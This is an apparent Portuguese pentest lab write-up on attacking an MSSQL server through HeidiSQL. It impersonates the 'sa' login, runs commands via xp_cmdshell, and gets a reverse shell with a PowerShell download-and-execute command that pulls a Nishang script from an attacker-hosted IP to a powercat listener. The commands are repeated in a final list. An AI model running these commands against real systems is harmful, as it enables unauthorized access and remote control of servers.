---
title: "Active Directory - HeidiSQL"
tags: [Windows,Active Directory]
categories: ActiveDirectory
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/heidisql.png)

# Considerações Iniciais

Agora, vamos fazer o SQL de maneira diferente, através do acesso que temos nele, utilizando o HeidiSQL

Link para download do HeidiSQL

[HeidiSQL](https://www.heidisql.com/download.php)

E claro, obviamente, esconderei todas as menções para qual ambiente estou realizando a enumeração, aqui é apenas para fins didáticos!

# Conectando na Database

Uma vez que verificamos que temos uma database acessível lá no PowerUpSQL agora é hora de verificarmos se temos acesso a ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/heidi.png)

Conseguimos conexão!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/heidi1.png)

# Explorando o servidor

Uma vez conectados agora é hora de iniciar a exploração desse servidor

## User Impersonation

Uma vez logados no HeidiSQL, devemos procurar por usuários que temos poder de impersonificar, no caso rodar como se fosse 'runas', os comandos para verificar isso são:

```
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/heidi2.png)

Fontes:

[Link 1](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/)

[Link 2](https://cheats.philkeeble.com/active-directory/mssql)

Verificamos que podemos impersonificar dois usuários, o `sa` e o `dbuser`

Então vamos lá!

## Remote Code Execution

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'whoami'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/heidi3.png)

Temos RCE!

Agora é só pegar um reverse shell ali!

Iremos utilizar o `Invoke-PowerShellTCP.ps1` do Nishang

[PowerShellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

O `HFS` para hospedar nosso servidor web onde o servidor remoto irá fazer as requisições

[HFS](https://www.rejetto.com/hfs/)

E o `powercat` para receber a conexão reversa

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

Setamos o powercat na porta 443 para receber a conexão reversa

`powercat -l -v -p 443 -t 1000`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/rev.png)

Arrumamos (colocamos a chamada da função no final dela pra automaticamente executar o reverse shell) e upamos o Invoke-PowerShellTCP.ps1 no HFS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/rev1.png)

Executamos a chamada no HeidiSQL e recebemos a reverse shell!

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'powershell.exe IEX((New-Object Net.WebClient).DownloadString(''http://192.168.50.196/Invoke-PowerShellTCP.ps1''))'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/heidi4.png)

Show!

# Conclusão

Então agora terminamos de explorar o MSSQLServer por outro modo, através do HEIDISql.

## Comandos Utilizados

```
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'whoami'
```

`powercat -l -v -p 443 -t 1000`

```
EXECUTE AS LOGIN = 'dbuser'
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'powershell.exe IEX((New-Object Net.WebClient).DownloadString(''http://192.168.50.196/Invoke-PowerShellTCP.ps1''))'
```